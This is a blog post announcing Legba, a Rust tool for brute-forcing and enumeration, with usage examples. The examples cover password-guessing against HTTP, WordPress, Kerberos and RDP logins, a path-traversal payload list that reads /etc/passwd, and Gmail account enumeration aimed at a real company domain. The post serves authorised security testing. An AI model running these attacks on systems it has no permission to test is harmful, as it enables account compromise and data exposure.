<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>Enumerate/Bruteforce/Attack All the Things! Presenting Legba | evilsocket</title>
<meta name="description" content="">


  <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml">


<link rel="icon" href="/images/favicon.ico">

<!-- Open Graph -->
<meta property="og:type" content="article">
<meta property="og:title" content="Enumerate/Bruteforce/Attack All the Things! Presenting Legba">
<meta property="og:description" content="">
<meta property="og:url" content="/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/">
<meta property="og:site_name" content="evilsocket">

  
  
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/VeveLegba.svg/800px-VeveLegba.svg.png">
  


<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Enumerate/Bruteforce/Attack All the Things! Presenting Legba">
<meta name="twitter:description" content="">

<!-- Schema.org JSON-LD -->


<script type="application/ld+json">
{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/"},"headline":"Enumerate/Bruteforce/Attack All the Things! Presenting Legba","description":"","image":"https://www.evilsocket.nethttps://upload.wikimedia.org/wikipedia/commons/thumb/7/77/VeveLegba.svg/800px-VeveLegba.svg.png","datePublished":"2023-11-02T16:46:32.000Z","dateModified":"2023-11-02T19:55:18.000Z","author":{"@type":"Person","name":"Simone Margaritelli","description":"Italian cybersecurity researcher and open-source developer","url":"https://www.evilsocket.net","sameAs":["https://github.com/evilsocket","https://twitter.com/evilsocket","http://it.linkedin.com/in/simonemargaritelli/"],"jobTitle":"Security Researcher","worksFor":{"@type":"Organization","name":"Independent"}},"publisher":{"@type":"Organization","name":"evilsocket","url":"https://www.evilsocket.net","logo":{"@type":"ImageObject","url":"https://www.evilsocket.net/images/glider.png"}},"keywords":"rust, tokio, async, bruteforce, wordlist, dns subdomain enumeration, password, authentication, red team, multi protocol, legba, hydra, amqp, http, csrf token, ntlm, kerberos, kerberos pre-authentication, imap, ldap, mongodb, oracle, mssql, mysql, cassandra, pgsql, pop3, rdp, redis, scylladb, sftp, smtp, ssh, stomp, port scanner, telnet, vnc","articleSection":"Technology","inLanguage":"en"}
</script>


<!-- Fonts -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<!-- Styles -->
<link rel="stylesheet" href="/css/style.css">


<!-- Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-22026549-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-22026549-1');
</script>


<meta name="generator" content="Hexo 5.4.2"></head>
<body class="post-page">
  <header class="site-header">
  <div class="header-inner">
    <div class="site-branding">
      <a href="/" class="site-logo">
        
          <img src="/images/glider.png" alt="evilsocket" width="50" height="50">
        
        <span class="site-title">evilsocket</span>
      </a>
    </div>
    
    <nav class="site-nav">
      
        <a href="/" class="nav-link">
          HOME
        </a>
      
        <a href="/atom.xml" class="nav-link">
          RSS
        </a>
      
    </nav>
  </div>
</header>

  
  <main class="main-content">
    <article class="post-full">
  <header class="post-header">
    <h1 class="post-title">Enumerate/Bruteforce/Attack All the Things! Presenting Legba</h1>
    <div class="post-meta">
      BY <span class="post-author">Simone Margaritelli</span>
      â€” <time datetime="2023-11-02T16:46:32.000Z">2 Nov 2023</time>
      
        â€” <a href="/tags/rust/" class="post-category">rust</a>, <a href="/tags/tokio/" class="post-category">tokio</a>, <a href="/tags/async/" class="post-category">async</a>, <a href="/tags/bruteforce/" class="post-category">bruteforce</a>, <a href="/tags/wordlist/" class="post-category">wordlist</a>, <a href="/tags/dns-subdomain-enumeration/" class="post-category">dns subdomain enumeration</a>, <a href="/tags/password/" class="post-category">password</a>, <a href="/tags/authentication/" class="post-category">authentication</a>, <a href="/tags/red-team/" class="post-category">red team</a>, <a href="/tags/multi-protocol/" class="post-category">multi protocol</a>, <a href="/tags/legba/" class="post-category">legba</a>, <a href="/tags/hydra/" class="post-category">hydra</a>, <a href="/tags/amqp/" class="post-category">amqp</a>, <a href="/tags/http/" class="post-category">http</a>, <a href="/tags/csrf-token/" class="post-category">csrf token</a>, <a href="/tags/ntlm/" class="post-category">ntlm</a>, <a href="/tags/kerberos/" class="post-category">kerberos</a>, <a href="/tags/kerberos-pre-authentication/" class="post-category">kerberos pre-authentication</a>, <a href="/tags/imap/" class="post-category">imap</a>, <a href="/tags/ldap/" class="post-category">ldap</a>, <a href="/tags/mongodb/" class="post-category">mongodb</a>, <a href="/tags/oracle/" class="post-category">oracle</a>, <a href="/tags/mssql/" class="post-category">mssql</a>, <a href="/tags/mysql/" class="post-category">mysql</a>, <a href="/tags/cassandra/" class="post-category">cassandra</a>, <a href="/tags/pgsql/" class="post-category">pgsql</a>, <a href="/tags/pop3/" class="post-category">pop3</a>, <a href="/tags/rdp/" class="post-category">rdp</a>, <a href="/tags/redis/" class="post-category">redis</a>, <a href="/tags/scylladb/" class="post-category">scylladb</a>, <a href="/tags/sftp/" class="post-category">sftp</a>, <a href="/tags/smtp/" class="post-category">smtp</a>, <a href="/tags/ssh/" class="post-category">ssh</a>, <a href="/tags/stomp/" class="post-category">stomp</a>, <a href="/tags/port-scanner/" class="post-category">port scanner</a>, <a href="/tags/telnet/" class="post-category">telnet</a>, <a href="/tags/vnc/" class="post-category">vnc</a>
      
    </div>
  </header>

  
  
    <div class="post-cover">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/VeveLegba.svg/800px-VeveLegba.svg.png" alt="Enumerate/Bruteforce/Attack All the Things! Presenting Legba">
    </div>
  

  <div class="post-content">
    <p>During the last few weeks Iâ€™ve been working on a new tool that started as a way for me to become more familiar with Rust and its <a target="_blank" rel="noopener" href="https://tokio.rs/">tokio asynchronous runtime</a> and then quickly turned into quite a comprehensive and efficient replacement for similar tools (thc-hydra, medusa, patator, etc). In this blog post Iâ€™m going to briefly present <a target="_blank" rel="noopener" href="https://github.com/evilsocket/legba">project Legba</a>, the reasons behind its implementation and a few of the many possible use cases.</p>
<a href="https://en.wikipedia.org/wiki/Papa_Legba" target="_blank">
<img width="350px" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/VeveLegba.svg/800px-VeveLegba.svg.png"/>
</a>

<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it evilsocket/legba:latest -h </span><br></pre></td></tr></table></figure>

<p>Donâ€™t forget to <a target="_blank" rel="noopener" href="https://github.com/evilsocket/legba/wiki">RTFM</a>.</p>
<h2 id="Rust-Async-FTW"><a href="#Rust-Async-FTW" class="headerlink" title="Rust + Async FTW"></a>Rust + Async FTW</h2><p>When searching for authentication bruteforcing and wordlist attack tools, most of the times <a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">THC Hydra</a> is presented as the de facto standard, with some minor alternatives that are either 1-to-1 copies of it, much slower Python implementations, or protocol specific implementations.</p>
<p>While studying Hydra source code, three main factors caught my attention:</p>
<ol>
<li>Itâ€™s using <a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra-mod.c">blocking sockets</a>, meaning suboptimal scaling of I/O concurrent operations.</li>
<li>Itâ€™s implemented in a non memory safe language.</li>
<li>It does not support modern features such as CSRF token grabbing for HTTP requests, Kerberos Pre-Auth and more.</li>
</ol>
<p>For these reasons (and because I was a bit bored after months of not coding anything) I decided to work on Legba, with the following objectives in mind:</p>
<ol>
<li>Use Rust which would not only make the tool blazing fast, but memory safe and efficient.</li>
<li>Use an asynchronous runtime in order to get the best possible performance.</li>
<li>Implement it as a generic framework that supports highly modular plugins in order to easily add new features without touching the core.</li>
</ol>
<p>After some hours of coding, refactoring and optimizing Iâ€™ve come up with something thatâ€™s (in my opinion) pretty great. With an average runtime memory usage of less than 15MB, Legba beats Hydra in terms of efficiency by several orders of magnitude. </p>
<p>Hereâ€™s a benchmark of the two running some common plugins, both targeting the same test servers on localhost. The benchmark has been executed on a macOS laptop with an M1 Max CPU, using a wordlist of 1000 passwords with the correct one being on the last line. Legba was compiled in release mode, Hydra compiled and installed via <a target="_blank" rel="noopener" href="https://formulae.brew.sh/formula/hydra">brew formula</a>.</p>
<p>Far from being an exhaustive benchmark, this table still gives a clear idea of how using an asynchronous runtime can drastically improve performances.</p>
<table>
<thead>
<tr>
<th>Test Name</th>
<th>Hydra Tasks</th>
<th>Hydra Time</th>
<th>Legba Tasks</th>
<th>Legba Time</th>
</tr>
</thead>
<tbody><tr>
<td>HTTP basic auth</td>
<td>16</td>
<td>7.100s</td>
<td>10</td>
<td>1.560s <strong>(ðŸš€ 4.5x faster)</strong></td>
</tr>
<tr>
<td>HTTP POST login (wordpress)</td>
<td>16</td>
<td>14.854s</td>
<td>10</td>
<td>5.045s <strong>(ðŸš€ 2.9x faster)</strong></td>
</tr>
<tr>
<td>SSH</td>
<td>16</td>
<td>7m29.85s *</td>
<td>10</td>
<td>8.150s <strong>(ðŸš€ 55.1x faster)</strong></td>
</tr>
<tr>
<td>MySQL</td>
<td>4 **</td>
<td>9.819s</td>
<td>4 **</td>
<td>2.542s <strong>(ðŸš€ 3.8x faster)</strong></td>
</tr>
<tr>
<td>Microsoft SQL</td>
<td>16</td>
<td>7.609s</td>
<td>10</td>
<td>4.789s <strong>(ðŸš€ 1.5x faster)</strong></td>
</tr>
</tbody></table>
<p><sup>* While this result would suggest a default delay between connection attempts used by Hydra. Iâ€™ve tried to study the source code to find such delay but to my knowledge thereâ€™s none. For some reason itâ€™s simply very slow.</sup><br><sup>** For MySQL hydra automatically reduces the amount of tasks to 4, therefore legbaâ€™s concurrency level has been adjusted to 4 as well.</sup></p>
<p>Note how, while using less concurrent tasks, Legba is faster and in most cases more memory efficient.</p>
<h2 id="A-Framework-For-Everything"><a href="#A-Framework-For-Everything" class="headerlink" title="A Framework For Everything"></a>A Framework For Everything</h2><p>After implementing the core framework and the first protocol plugins, I realized that the tool functionalities went beyond just attacking authentication mechanisms via bruteforcing and wordlist attacks. Any type of enumeration task that requires an efficient parallelism and network I/O would be a good fit for it. This resulted in an extensive list of modules covering both authentication and enumeration of resources. Iâ€™ll add here just a few use cases, I highly recommend you guys to check <a target="_blank" rel="noopener" href="https://github.com/evilsocket/legba/wiki">the project wiki</a> for the documentation and a full list of features.</p>
<h3 id="All-the-HTTP-Things"><a href="#All-the-HTTP-Things" class="headerlink" title="All the HTTP Things"></a>All the HTTP Things</h3><p>The very first module I developed, of course, was the HTTP module, which quickly became a set of different submodules supporting all sorts of things, such as:</p>
<p><strong>HTTP Basic Authentication</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba http.basic \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --target http://localhost:8888/</span><br></pre></td></tr></table></figure>

<p><strong>HTTP Requests with NTLMv1 and NTLMv2 Authentication</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">legba http.ntlm2 \ <span class="comment"># use http.ntlm1 for v1.0</span></span><br><span class="line">    --domain example.org \</span><br><span class="line">    --workstation client \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --target https://localhost:8888/</span><br></pre></td></tr></table></figure>

<p><strong>HTTP Pages Enumeration</strong></p>
<p>This was implemented to replace <a target="_blank" rel="noopener" href="https://github.com/evilsocket/dirsearch">dirsearch</a>.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">legba http.enum \</span><br><span class="line">    --payloads data/pages.txt \</span><br><span class="line">    --target http://localhost:8888/ \</span><br><span class="line">    --http-enum-ext php \ <span class="comment"># php is the default value for file extensions</span></span><br><span class="line">    --http-success-codes 200 </span><br></pre></td></tr></table></figure>

<p>Wordpress plugin discovery using interpolation syntax:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba http.enum \</span><br><span class="line">    --payloads data/wordpress-plugins.txt \</span><br><span class="line">    --target http://localhost:8888/wp-content/plugins/&#123;PAYLOAD&#125;/readme.txt \</span><br><span class="line">    --http-success-codes 200 </span><br></pre></td></tr></table></figure>

<p>LFI vulnerability fuzzing:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba http.enum \</span><br><span class="line">    --payloads data/lfi.txt \</span><br><span class="line">    --target http://localhost:8888/ \</span><br><span class="line">    --http-success-string <span class="string">&quot;root:&quot;</span></span><br></pre></td></tr></table></figure>

<p>The <code>data/lfi.txt</code> would be something like:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</span><br><span class="line">file?filename&#x3D;..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc&#x2F;passwd</span><br><span class="line">...</span><br><span class="line">... and so on ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Google Suite / GMail valid accounts enumeration (this is a pretty neat trick that <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket/status/1720063591007543775">Iâ€™ve recently found out about</a>):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">legba http.enum \</span><br><span class="line">    --payloads data/employees-names.txt \</span><br><span class="line">    --http-success-string <span class="string">&quot;COMPASS&quot;</span> \</span><br><span class="line">    --http-success-codes 204 \</span><br><span class="line">    --quiet \</span><br><span class="line">    --target <span class="string">&quot;https://mail.google.com/mail/gxlu?email=&#123;PAYLOAD&#125;@broadcom.com&quot;</span> </span><br></pre></td></tr></table></figure>

<p><strong>Various web login pages</strong></p>
<p>HTTP Post Request (Wordpress wp-login.php page):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">legba http \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --target http://localhost:8888/wp-login.php \</span><br><span class="line">    --http-method POST \</span><br><span class="line">    --http-success-codes 302 \ <span class="comment"># wordpress redirects on successful login</span></span><br><span class="line">    --http-payload <span class="string">&#x27;log=&#123;USERNAME&#125;&amp;pwd=&#123;PASSWORD&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>HTTP Post Request (Wordpress xmlrpc.php)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">legba http \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --target http://localhost:8888/xmlrpc.php \</span><br><span class="line">    --http-method POST \</span><br><span class="line">    --http-payload <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;&#123;USERNAME&#125;&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;&#123;PASSWORD&#125;&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&#x27;</span> \</span><br><span class="line">    --http-success-string <span class="string">&#x27;isAdmin&#x27;</span> <span class="comment"># what string successful response will contain</span></span><br></pre></td></tr></table></figure>

<p>Or using the @ syntax to load the payload from a file:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">legba http \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --target http://localhost:8888/xmlrpc.php \</span><br><span class="line">    --http-method POST \</span><br><span class="line">    --http-payload @xmlrpc-payload.xml \</span><br><span class="line">    --http-success-string <span class="string">&#x27;isAdmin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>HTTP Post Request with CSRF Token grabbing:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">legba http \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --target http://localhost:8888/ \</span><br><span class="line">    --http-csrf-page http://localhost:8888/ \ <span class="comment"># where to grab the CSRF token from, or empty if it&#x27;s the same as --target</span></span><br><span class="line">    --http-csrf-regexp <span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;(token)&quot; value=&quot;([^\&quot;]+)&quot;&#x27;</span> \ <span class="comment"># regular expression to extract it</span></span><br><span class="line">    --http-method POST \</span><br><span class="line">    --http-payload <span class="string">&#x27;user=&#123;USERNAME&#125;&amp;pass=&#123;PASSWORD&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="DNS-Subdomain-Enumeration"><a href="#DNS-Subdomain-Enumeration" class="headerlink" title="DNS Subdomain Enumeration"></a>DNS Subdomain Enumeration</h3><p>I wanted to write something faster and simpler than my <a target="_blank" rel="noopener" href="https://github.com/evilsocket/xray">XRay</a>, therefore:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba dns \</span><br><span class="line">    --payloads data/200k-dns.txt \</span><br><span class="line">    --target something.com \</span><br><span class="line">    --dns-resolvers <span class="string">&quot;1.1.1.1&quot;</span> <span class="comment"># comma separated list of DNS resolvers, do not pass to use the system resolver</span></span><br></pre></td></tr></table></figure>

<h3 id="TCP-Port-Scanning"><a href="#TCP-Port-Scanning" class="headerlink" title="TCP Port Scanning"></a>TCP Port Scanning</h3><p>Because why the hell not?! :D</p>
<p>Scan all TCP ports with a 300ms timeout:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">legba tcp.ports \</span><br><span class="line">    --target something.com \</span><br><span class="line">    --timeout 300 </span><br></pre></td></tr></table></figure>

<p>Scan a custom range of ports with a 300ms timeout:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba tcp.ports \</span><br><span class="line">    --target something.com \</span><br><span class="line">    --tcp-ports <span class="string">&#x27;80-10000&#x27;</span> \</span><br><span class="line">    --timeout 300 </span><br></pre></td></tr></table></figure>

<p>Scan a custom list of ports with a 300ms timeout:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba tcp.ports \</span><br><span class="line">    --target something.com \</span><br><span class="line">    --tcp-ports <span class="string">&#x27;21, 22, 80, 443, 8080&#x27;</span> \</span><br><span class="line">    --timeout 300 </span><br></pre></td></tr></table></figure>

<h3 id="Other-Protocols"><a href="#Other-Protocols" class="headerlink" title="Other Protocols"></a>Other Protocols</h3><p><strong>Kerberos 5 Pre-Auth (users enumeration and password authentication).</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">legba kerberos \</span><br><span class="line">    --target dc.example.org \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --kerberos-realm example.org</span><br></pre></td></tr></table></figure>

<p><strong>Microsoft Remote Desktop</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba rdp \</span><br><span class="line">    --target localhost:3389 \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password data/passwords.txt</span><br></pre></td></tr></table></figure>

<p>The list goes on and on, at the time of writing (<a target="_blank" rel="noopener" href="https://github.com/evilsocket/legba/wiki">check the wiki for updates!</a>) the list of supported features and protocols is: AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace), Cassandra/ScyllaDB, DNS subdomain enumeration, FTP, HTTP (basic authentication, NTLMv1, NTLMv2, multipart form, custom requests with CSRF support and files/folders enumeration), IMAP, Kerberos pre-authentication and user enumeration, LDAP, MongoDB, Microsoft SQL, MySQL, Oracle, PostgreSQL, POP3, RDP, Redis, SSH / SFTP, SMTP, STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ), TCP port scanning, Telnet, VNC.</p>
<h2 id="Fin"><a href="#Fin" class="headerlink" title="Fin"></a>Fin</h2><p>As usual, the tool is released under the GPL3 license and all contributions are more than welcome. Enjoy ^_^</p>

  </div>

  
    <div class="post-tags">
      
        <a href="/tags/rust/" class="tag">#rust</a>
      
        <a href="/tags/tokio/" class="tag">#tokio</a>
      
        <a href="/tags/async/" class="tag">#async</a>
      
        <a href="/tags/bruteforce/" class="tag">#bruteforce</a>
      
        <a href="/tags/wordlist/" class="tag">#wordlist</a>
      
        <a href="/tags/dns-subdomain-enumeration/" class="tag">#dns subdomain enumeration</a>
      
        <a href="/tags/password/" class="tag">#password</a>
      
        <a href="/tags/authentication/" class="tag">#authentication</a>
      
        <a href="/tags/red-team/" class="tag">#red team</a>
      
        <a href="/tags/multi-protocol/" class="tag">#multi protocol</a>
      
        <a href="/tags/legba/" class="tag">#legba</a>
      
        <a href="/tags/hydra/" class="tag">#hydra</a>
      
        <a href="/tags/amqp/" class="tag">#amqp</a>
      
        <a href="/tags/http/" class="tag">#http</a>
      
        <a href="/tags/csrf-token/" class="tag">#csrf token</a>
      
        <a href="/tags/ntlm/" class="tag">#ntlm</a>
      
        <a href="/tags/kerberos/" class="tag">#kerberos</a>
      
        <a href="/tags/kerberos-pre-authentication/" class="tag">#kerberos pre-authentication</a>
      
        <a href="/tags/imap/" class="tag">#imap</a>
      
        <a href="/tags/ldap/" class="tag">#ldap</a>
      
        <a href="/tags/mongodb/" class="tag">#mongodb</a>
      
        <a href="/tags/oracle/" class="tag">#oracle</a>
      
        <a href="/tags/mssql/" class="tag">#mssql</a>
      
        <a href="/tags/mysql/" class="tag">#mysql</a>
      
        <a href="/tags/cassandra/" class="tag">#cassandra</a>
      
        <a href="/tags/pgsql/" class="tag">#pgsql</a>
      
        <a href="/tags/pop3/" class="tag">#pop3</a>
      
        <a href="/tags/rdp/" class="tag">#rdp</a>
      
        <a href="/tags/redis/" class="tag">#redis</a>
      
        <a href="/tags/scylladb/" class="tag">#scylladb</a>
      
        <a href="/tags/sftp/" class="tag">#sftp</a>
      
        <a href="/tags/smtp/" class="tag">#smtp</a>
      
        <a href="/tags/ssh/" class="tag">#ssh</a>
      
        <a href="/tags/stomp/" class="tag">#stomp</a>
      
        <a href="/tags/port-scanner/" class="tag">#port scanner</a>
      
        <a href="/tags/telnet/" class="tag">#telnet</a>
      
        <a href="/tags/vnc/" class="tag">#vnc</a>
      
    </div>
  

  <nav class="post-navigation">
    
      <a href="/2024/09/13/Introducing-bettercap-2-4-0-CAN-bus-hacking-WiFi-bruteforcing-and-builtin-web-UI/" class="nav-prev">
        <span class="nav-label">PREVIOUS</span>
        <span class="nav-title">Introducing Bettercap 2.4.0: CAN-Bus Hacking, WiFi Bruteforcing and Builtin Web UI</span>
      </a>
    
    
      <a href="/2022/10/20/Reverse-Engineering-the-Apple-MultiPeer-Connectivity-Framework/" class="nav-next">
        <span class="nav-label">NEXT</span>
        <span class="nav-title">Reverse Engineering the Apple MultiPeer Connectivity Framework</span>
      </a>
    
  </nav>
</article>


  


<section class="related-posts">
  <h3 class="related-title">YOU MIGHT ALSO LIKE...</h3>
  <div class="cards-grid cards-grid-related">
    
      

<article class="card card-light">
  <a href="/2016/01/28/Why-you-shouldn-t-trust-CloudFlare-s-Flexible-SSL-and-how-to-bypass-it-with-BetterCap/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2016/01/Schermata-2016-01-28-alle-18-08-27.png')">
        
      </div>
    
    
    
      <div class="card-content">
        
          <span class="card-category">bettercap</span>
        
        <h2 class="card-title">Why You Shouldn&#39;t Trust CloudFlare&#39;s &#39;Flexible SSL&#39; and How to Bypass It With BetterCap</h2>
        
        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2015/02/01/Huawei-Modems-Authentication-Bypass/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2015/02/Huawei-Logo1422524173.jpg')">
        
          <div class="card-overlay-content">
            
              <span class="card-category">hack</span>
            
            <h2 class="card-title">Huawei Modems Authentication Bypass</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2015/01/29/Nike-FuelBand-SE-BLE-Protocol-Reversed/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2015/Jan/nikeband.jpg')">
        
          <div class="card-overlay-content">
            
              <span class="card-category">reversing</span>
            
            <h2 class="card-title">Nike+ FuelBand SE BLE Protocol Reversed</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-light">
  <a href="/2025/03/13/How-To-Write-An-Agent/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2025/agent/loop.png')">
        
      </div>
    
    
    
      <div class="card-content">
        
          <span class="card-category">agent</span>
        
        <h2 class="card-title">How to Write an Agent</h2>
        
        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
  </div>
</section>




  </main>
  
  <footer class="site-footer">
  <div class="footer-inner">
    <div class="footer-social">
      
        
          
            <a href="https://github.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
            </a>
          
        
          
            <a href="https://twitter.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
            </a>
          
        
          
            <a href="http://it.linkedin.com/in/simonemargaritelli/" class="social-link" target="_blank" rel="noopener" aria-label="LinkedIn">
